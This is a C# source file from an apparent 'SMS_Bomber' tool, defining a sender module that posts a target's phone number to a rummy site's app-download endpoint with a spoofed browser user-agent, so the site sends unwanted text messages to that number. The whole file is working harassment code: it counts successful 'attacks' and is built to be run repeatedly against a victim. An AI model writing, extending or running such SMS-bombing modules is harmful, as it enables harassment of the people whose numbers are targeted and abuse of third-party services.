using System;
using System.Net.Http;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace SMS_Bomber.Sender
{
    public class Adda52Rummy : ISender
    {
        public int Failed { get; set; }
        public int Attacked { get; set; }
        public int TotalRequest { get; set; }
        public string Provider => "Adda52Rummy";

        private readonly HttpClient Attacker = new HttpClient();
        private readonly Uri SendAPI = new Uri("https://inframs.adda52rummy.org/app-download-mobile");

        public async Task<bool> Attack(long To, bool Retry = false)
        {
            TotalRequest++;
            var AtkMSG = new HttpRequestMessage(HttpMethod.Post, SendAPI)
            {
                Content = new FormUrlEncodedContent(new Dictionary<string, string>
                {
                    { "email", "" },
                    { "ap1", "Send Link" },
                    { "app_type", "rummy" },
                    { "mobile", To.ToString() },
                    { "sdid", "bfa86f86-fb54-426c-9791-9418b3795ae9" }
                })
            };

            AtkMSG.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) " +
                "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36 Edg/95.0.1020.38");

            try
            {
                var AtkRES = await (await Attacker.SendAsync(AtkMSG)).Content.ReadAsStringAsync();
                if (AtkRES.Contains("\"status\":true")) { Attacked++; return true; }
            }
            catch { }

            Failed++;
            return false;
        }
    }
}
